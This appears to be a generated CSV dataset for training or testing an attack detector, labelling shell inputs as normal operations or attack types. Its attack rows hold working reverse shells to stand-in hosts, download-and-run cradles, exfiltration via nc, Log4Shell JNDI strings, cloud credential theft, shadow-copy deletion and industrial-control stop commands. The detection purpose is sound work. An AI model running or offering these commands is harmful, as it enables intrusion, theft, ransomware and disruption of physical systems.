timestamp,src_ip,input,label
2026-01-20T17:46:38.722168,100.103.211.163,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.730167,203.33.174.226,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.721658,126.132.248.50,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.734167,5.111.196.91,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.722168,103.129.91.247,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.728166,156.53.125.1,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T17:46:38.714423,168.226.113.13,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.726165,69.213.52.130,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.749363,119.163.107.108,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.706916,39.182.248.197,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T17:46:38.709422,76.109.153.235,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.711422,103.2.226.142,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.691848,92.49.223.207,git pull,Normal_Business_Ops
2026-01-20T17:46:38.708422,214.254.30.132,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T17:46:38.730167,223.44.249.141,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.723165,51.136.159.83,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.746362,30.253.242.74,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.683749,105.64.168.234,systemctl status docker,Normal_Business_Ops
2026-01-20T17:46:38.754419,91.233.249.108,cipher /w:C:\,Ransomware_Prep
2026-01-20T17:46:38.717597,220.171.13.96,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.749363,107.18.184.31,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.700357,181.156.41.42,git push origin main,Normal_Business_Ops
2026-01-20T17:46:38.700357,90.6.112.182,make build,Normal_Business_Ops
2026-01-20T17:46:38.700357,149.77.218.114,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.740386,219.41.255.248,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.728166,122.32.229.70,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.751920,41.202.48.224,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.699355,172.48.110.123,git push origin main,Normal_Business_Ops
2026-01-20T17:46:38.692357,151.9.84.178,git pull,Normal_Business_Ops
2026-01-20T17:46:38.715600,127.92.26.15,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.737706,178.60.62.244,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T17:46:38.751920,47.117.233.202,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.692357,138.14.89.134,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T17:46:38.747362,38.26.27.6,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.722168,90.65.181.148,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.737706,107.113.66.101,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.718598,205.216.13.16,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.695355,143.123.174.112,git pull,Normal_Business_Ops
2026-01-20T17:46:38.738701,144.153.132.133,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T17:46:38.736168,45.219.24.141,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.733168,171.63.77.13,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.684749,108.185.41.58,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T17:46:38.697356,169.221.126.55,pip install requests,Normal_Business_Ops
2026-01-20T17:46:38.729167,66.36.235.162,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.699355,187.176.45.172,history | tail -n 20,Normal_Business_Ops
2026-01-20T17:46:38.719650,203.107.161.158,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.751920,5.77.189.99,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.725166,31.228.156.107,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.730167,178.70.48.173,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.735167,176.255.166.157,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T17:46:38.706916,74.214.137.227,history | tail -n 20,Normal_Business_Ops
2026-01-20T17:46:38.734167,52.61.68.111,"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker.xyz:443",Advanced_RCE_&_C2
2026-01-20T17:46:38.693354,173.32.160.123,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.724165,210.29.152.148,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.684749,39.234.96.10,git fetch origin main,Normal_Business_Ops
2026-01-20T17:46:38.753424,161.159.129.139,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.695355,59.177.61.21,uptime,Normal_Business_Ops
2026-01-20T17:46:38.702379,73.189.133.196,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T17:46:38.738701,17.148.133.56,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T17:46:38.752911,23.230.116.177,cipher /w:C:\,Ransomware_Prep
2026-01-20T17:46:38.720628,103.95.129.9,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.719650,212.165.113.117,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.725166,204.248.68.11,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.713423,164.118.246.11,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.688752,135.133.197.16,git branch,Normal_Business_Ops
2026-01-20T17:46:38.744361,191.29.28.175,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.736168,21.234.116.124,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T17:46:38.743361,73.161.0.53,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.751920,202.129.181.233,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T17:46:38.729167,49.54.98.108,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.706408,37.239.35.14,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T17:46:38.750363,163.168.134.154,vssadmin.exe delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.715600,72.65.246.210,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.714423,2.135.89.17,curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.729167,16.29.255.193,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T17:46:38.740386,112.43.195.237,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T17:46:38.698355,208.46.90.116,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T17:46:38.694354,193.57.208.235,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T17:46:38.689753,196.216.115.2,netstat -tulpn,Normal_Business_Ops
2026-01-20T17:46:38.725166,60.231.10.107,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.731167,135.145.60.36,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.683749,157.210.153.167,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T17:46:38.755771,109.4.21.205,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.744361,53.54.69.202,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.737706,38.216.196.130,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.751920,126.112.100.185,cipher /w:C:\,Ransomware_Prep
2026-01-20T17:46:38.751920,208.128.212.11,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.752911,72.56.178.158,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.687752,73.130.46.156,netstat -tulpn,Normal_Business_Ops
2026-01-20T17:46:38.701356,81.134.152.244,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T17:46:38.716597,197.199.38.36,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.704359,156.255.93.63,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T17:46:38.726165,222.92.165.146,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.706916,6.119.246.197,git pull,Normal_Business_Ops
2026-01-20T17:46:38.683749,167.131.216.103,kubectl get services --all-namespaces,Normal_Business_Ops
2026-01-20T17:46:38.715600,213.104.22.124,"powershell.exe -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.688752,173.23.96.82,go run main.go,Normal_Business_Ops
2026-01-20T17:46:38.690278,179.186.217.104,git add .,Normal_Business_Ops
2026-01-20T17:46:38.692357,74.251.25.57,curl https://google.com,Normal_Business_Ops
2026-01-20T17:46:38.729167,160.210.17.42,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.698355,119.127.155.95,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T17:46:38.702379,156.128.123.166,go run main.go,Normal_Business_Ops
2026-01-20T17:46:38.754419,51.146.94.109,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T17:46:38.751920,34.239.251.254,wmic shadowcopy delete,Ransomware_Prep
2026-01-20T17:46:38.733168,167.69.185.84,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.745361,116.250.238.56,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.684749,49.203.93.134,uptime,Normal_Business_Ops
2026-01-20T17:46:38.683749,16.101.80.3,cat /etc/resolv.conf,Normal_Business_Ops
2026-01-20T17:46:38.720628,33.208.59.205,powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File c:\temp\s.ps1,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.712423,53.66.148.96,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T17:46:38.686752,7.181.222.207,git fetch origin main,Normal_Business_Ops
2026-01-20T17:46:38.745361,82.129.241.193,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.691848,119.91.129.118,uptime,Normal_Business_Ops
2026-01-20T17:46:38.708422,154.193.172.208,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.726165,201.179.24.37,bash -i >& /dev/tcp/1.2.3.4/8080 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.710422,168.167.147.78,docker run -it --rm -v /:/host/ root/ubuntu chroot /host/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.702379,61.148.92.132,whoami,Normal_Business_Ops
2026-01-20T17:46:38.748407,18.184.36.6,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.738701,169.202.92.125,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T17:46:38.714423,27.241.145.103,kubectl get secrets --all-namespaces -o json,Cloud_&_Container_Exploit
2026-01-20T17:46:38.724165,57.203.113.131,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.691257,36.80.2.16,pip install requests,Normal_Business_Ops
2026-01-20T17:46:38.687752,165.228.158.219,netstat -tulpn,Normal_Business_Ops
2026-01-20T17:46:38.748407,26.17.220.88,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.745361,180.241.186.137,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.689753,129.175.52.47,kubectl get services --all-namespaces,Normal_Business_Ops
2026-01-20T17:46:38.741361,65.133.156.237,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.709422,176.248.133.157,az account get-access-token --resource https://management.azure.com/,Cloud_&_Container_Exploit
2026-01-20T17:46:38.697356,8.222.3.150,npm start,Normal_Business_Ops
2026-01-20T17:46:38.731167,49.188.69.126,nc -lvp 4444 -e /bin/sh,Advanced_RCE_&_C2
2026-01-20T17:46:38.704359,147.230.231.129,journalctl -u ssh.service,Normal_Business_Ops
2026-01-20T17:46:38.751385,101.171.106.21,cipher /w:C:\,Ransomware_Prep
2026-01-20T17:46:38.742361,110.137.226.34,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.749363,165.18.210.145,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.697356,219.213.248.14,sudo systemctl restart nginx,Normal_Business_Ops
2026-01-20T17:46:38.734167,81.186.120.69,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.716597,84.228.95.128,"schtasks /create /sc minute /mo 1 /tn ""SystemUpdate"" /tr ""C:\temp\backdoor.exe""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.753424,11.152.140.66,cipher /w:C:\,Ransomware_Prep
2026-01-20T17:46:38.751920,88.113.45.109,cipher /w:C:\,Ransomware_Prep
2026-01-20T17:46:38.751920,112.207.34.37,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.735167,129.153.145.219,modbus_write_register 502 1 65535,Critical_Infrastructure_ICS
2026-01-20T17:46:38.751385,113.61.69.61,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.735167,11.139.111.173,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T17:46:38.689753,218.248.238.141,history | tail -n 20,Normal_Business_Ops
2026-01-20T17:46:38.687752,69.53.168.148,git pull,Normal_Business_Ops
2026-01-20T17:46:38.735167,204.61.20.238,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T17:46:38.710422,134.96.132.130,cat /run/secrets/kubernetes.io/serviceaccount/token,Cloud_&_Container_Exploit
2026-01-20T17:46:38.701356,105.143.23.234,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T17:46:38.698355,15.143.102.34,pip install requests,Normal_Business_Ops
2026-01-20T17:46:38.698355,24.135.211.138,git add .,Normal_Business_Ops
2026-01-20T17:46:38.740386,221.147.212.38,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T17:46:38.743361,160.186.103.169,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.723165,58.28.88.169,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.749363,207.102.150.32,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.730167,223.209.93.101,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.754419,19.147.193.149,cipher /w:C:\,Ransomware_Prep
2026-01-20T17:46:38.684749,62.118.164.15,git fetch origin main,Normal_Business_Ops
2026-01-20T17:46:38.737194,48.16.152.202,bacnet_scan --target 192.168.1.0/24,Critical_Infrastructure_ICS
2026-01-20T17:46:38.744361,206.85.100.229,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.693354,13.181.162.214,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T17:46:38.747362,112.235.197.243,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.697356,66.47.131.179,git pull,Normal_Business_Ops
2026-01-20T17:46:38.726165,34.108.94.199,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.747362,169.90.137.237,"{""__proto__"": {""polluted"": true}}",Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.699355,223.134.107.229,history | tail -n 20,Normal_Business_Ops
2026-01-20T17:46:38.691257,70.96.111.156,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T17:46:38.737706,177.57.32.17,modbus_client -m tcp -p 502 127.0.0.1 write_register 10 1000,Critical_Infrastructure_ICS
2026-01-20T17:46:38.721658,166.253.107.137,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.742361,151.157.124.58,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.744361,110.139.74.251,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.742361,216.124.52.45,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.706916,30.167.103.142,curl https://google.com,Normal_Business_Ops
2026-01-20T17:46:38.729167,170.132.3.55,"python -c ""import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.0.0.1"",80));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",-i""]);""",Advanced_RCE_&_C2
2026-01-20T17:46:38.754419,193.26.9.168,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T17:46:38.701356,67.85.16.117,ping -c 4 8.8.8.8,Normal_Business_Ops
2026-01-20T17:46:38.691257,214.7.132.251,tail -f /var/log/syslog,Normal_Business_Ops
2026-01-20T17:46:38.718598,191.9.223.108,chattr +i /home/user/.ssh/authorized_keys,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.704359,119.147.109.225,git fetch origin main,Normal_Business_Ops
2026-01-20T17:46:38.747362,16.241.55.32,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.697356,162.246.225.208,docker-compose up -d,Normal_Business_Ops
2026-01-20T17:46:38.691257,53.34.223.101,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T17:46:38.751920,60.51.94.145,cipher /w:C:\,Ransomware_Prep
2026-01-20T17:46:38.747362,62.27.69.68,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.737706,113.76.244.45,s7_comm_stop_cpu_all,Critical_Infrastructure_ICS
2026-01-20T17:46:38.720628,162.112.70.252,bitsadmin /transfer myJob http://bad.com/payload.exe C:\temp\p.exe,Advanced_Persistence_&_LotL
2026-01-20T17:46:38.754419,111.89.106.31,tar -czvf - /etc/ | nc attacker.host 9999,Ransomware_Prep
2026-01-20T17:46:38.748407,127.189.81.101,$(curl -s http://attacker.com/$(whoami)),Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.706408,130.124.91.32,ssh admin@10.0.0.5,Normal_Business_Ops
2026-01-20T17:46:38.739701,75.126.153.163,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T17:46:38.691848,50.28.53.84,git branch,Normal_Business_Ops
2026-01-20T17:46:38.726165,147.156.203.135,sh -i >& /dev/tcp/attacker.xyz/443 0>&1,Advanced_RCE_&_C2
2026-01-20T17:46:38.726165,50.230.103.204,"bash -c ""exec 5<>/dev/tcp/attacker.xyz/443;cat <&5 | while read line; do $line 2>&5 >&5; done""",Advanced_RCE_&_C2
2026-01-20T17:46:38.716597,131.146.0.191,"echo ""*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/attacker.com/80 0>&1'"" | crontab -",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.695355,53.44.242.98,curl https://google.com,Normal_Business_Ops
2026-01-20T17:46:38.713423,47.127.247.179,curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role,Cloud_&_Container_Exploit
2026-01-20T17:46:38.744361,124.74.58.55,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.754419,199.68.23.211,cipher /w:C:\,Ransomware_Prep
2026-01-20T17:46:38.710422,55.183.142.172,aws s3 sync s3://company-private-bucket ./stolen-data,Cloud_&_Container_Exploit
2026-01-20T17:46:38.746362,177.246.210.119,${jndi:rmi://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.743361,48.125.185.35,${jndi:ldap://attacker.cloud/exploit},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.684749,122.23.1.115,ls -lha /var/www/html,Normal_Business_Ops
2026-01-20T17:46:38.702379,125.112.80.123,"grep ""error"" application.log",Normal_Business_Ops
2026-01-20T17:46:38.744361,87.188.25.46,${jndi:dns://attacker.cloud/a},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.722168,1.150.174.221,"powershell -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://bad.io')""",Advanced_Persistence_&_LotL
2026-01-20T17:46:38.688752,212.1.234.37,make build,Normal_Business_Ops
2026-01-20T17:46:38.739701,156.109.60.161,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T17:46:38.747362,42.15.109.63,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.726165,43.81.14.235,"python3 -c ""import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('1.2.3.4',443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')""",Advanced_RCE_&_C2
2026-01-20T17:46:38.684749,6.101.211.158,ps -ef | grep python,Normal_Business_Ops
2026-01-20T17:46:38.705366,26.131.138.75,git add .,Normal_Business_Ops
2026-01-20T17:46:38.736168,122.116.206.190,set_pump_speed 10000 --force,Critical_Infrastructure_ICS
2026-01-20T17:46:38.691257,72.14.153.219,df -h,Normal_Business_Ops
2026-01-20T17:46:38.690278,29.66.63.116,vi /etc/nginx/nginx.conf,Normal_Business_Ops
2026-01-20T17:46:38.754419,132.25.192.114,openssl enc -aes-256-cbc -in production.db -out production.db.enc,Ransomware_Prep
2026-01-20T17:46:38.736168,54.206.17.68,ethernet_ip_request --service 0x4C --class 0x67,Critical_Infrastructure_ICS
2026-01-20T17:46:38.753424,205.63.190.99,vssadmin delete shadows /all /quiet,Ransomware_Prep
2026-01-20T17:46:38.744361,149.5.73.104,{{7*7}},Supply_Chain_&_Log4Shell
2026-01-20T17:46:38.689753,105.244.93.27,df -h,Normal_Business_Ops
